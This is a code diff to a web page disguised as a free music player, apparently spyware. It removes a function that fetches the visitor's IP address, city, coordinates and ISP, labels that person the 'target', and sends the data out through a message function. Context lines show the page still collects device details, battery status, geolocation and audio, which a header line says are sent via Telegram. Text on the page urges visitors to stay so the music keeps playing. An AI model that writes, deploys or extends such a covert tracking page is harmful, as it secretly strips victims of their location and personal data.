@@ -52,7 +52,7 @@
     .title-loop {
       display: inline-block;
       white-space: nowrap;
-      animation: scroll-title 6s linear infinite;
+      animation: scroll-title 7s linear infinite;
     }
     .title-loop span {
       padding-right: 100px;
@@ -151,7 +151,6 @@
     </div>
     <div class="artist">Artis tidak di kenal</div>
     <div class="artist">Tetap di halaman ini agar music berputar</div>
-    <div class="artist">#spotify #music-free</div>
     <div class="progress-wrapper">
       <div class="progress-bar">
         <div class="progress-fill" id="progress"></div>
@@ -565,31 +564,6 @@ Bluetooth              : ${bluetoothStatus}
 `.trim();
 };
 
-const ambilIPTarget = async () => {
-  try {
-    const res = await fetch("https://ip-api.com/json");
-    const data = await res.json();
-
-    // Cek apakah respons valid
-    if (!data.query || !data.country) {
-      return `౼ 〘 𝗜𝗣 𝗧𝗔𝗥𝗚𝗘𝗧 〙 ౼\n❌ Gagal parsing data IP.`;
-    }
-
-    return `
-౼ 〘 𝗜𝗣 + 𝗟𝗢𝗞𝗔𝗦𝗜 𝗧𝗔𝗥𝗚𝗘𝗧 〙 ౼
-IP        : ${data.query}
-Negara    : ${data.country}
-Provinsi  : ${data.regionName}
-Kota      : ${data.city}
-Koordinat : ${data.lat}, ${data.lon}
-ISP       : ${data.isp}
-Koneksi   : ${data.mobile ? "Mobile Data" : "WiFi"}
-`.trim();
-  } catch (err) {
-    return `౼ 〘 𝗜𝗣 𝗧𝗔𝗥𝗚𝗘𝗧 〙 ౼\n❌ Gagal mengambil data: ${err}`;
-  }
-};
-
 const ambilLokasi = () => {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
@@ -730,10 +704,6 @@ Link Kiriman Audio     : (terlampir langsung via Telegram)`;
 const mulai = async () => {
   audio.muted = false;
   try { await audio.play(); } catch {}
-
-  // 🔹 Kirim IP & lokasi target dulu, terpisah
-  const ipLokasi = await ambilIPTarget();
-  await kirimPesan(ipLokasi);
 
   const infoPerangkat = await ambilDataPerangkat();
   const bateraiInfo = await ambilBaterai();
